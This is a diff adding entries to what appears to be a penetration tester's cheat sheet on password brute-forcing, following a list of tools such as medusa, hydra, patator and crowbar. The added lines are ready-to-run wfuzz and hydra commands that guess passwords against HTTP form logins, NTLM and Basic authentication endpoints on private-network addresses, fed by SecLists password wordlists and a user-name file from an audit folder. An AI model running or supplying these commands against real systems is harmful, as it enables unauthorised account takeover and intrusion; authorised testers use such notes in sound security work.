@@ -8,3 +8,12 @@ medusa -H hostsfile -U usersfile -P passwordfile -M module
 patator
 hydra
 crowbar
+
+
+POST
+wfuzz --hc 404 -c -z list,admin -z file,/opt/SecLists/Passwords/korelogic-password.txt -d "user=FUZZ&password=FUZZ" http://192.168.1.111/admin/index.php
+hydra 192.168.1.111 -s 80 http-form-post "/admin/index.php:user=^USER^&password=^PASS^:Moved Temporarily" -l admin -P /opt/SecLists/Passwords/korelogic-password.txt -t 20
+NTLM
+wfuzz -c --ntlm "admin:FUZZ" -z file,/opt/SecLists/Passwords/darkc0de.txt --hc 401 https://192.168.3.11/api
+BASIC AUTH (through proxy)
+wfuzz -c --hc 404,400,401 -z file,/opt/SecLists/Passwords/korelogic-password.txt -z file,/root/Documents/Audits/ActivosProduban/names.txt --basic "FUZZ:FUZ2Z" -p 127.0.0.1:8080 https://192.168.3.11/api/v1
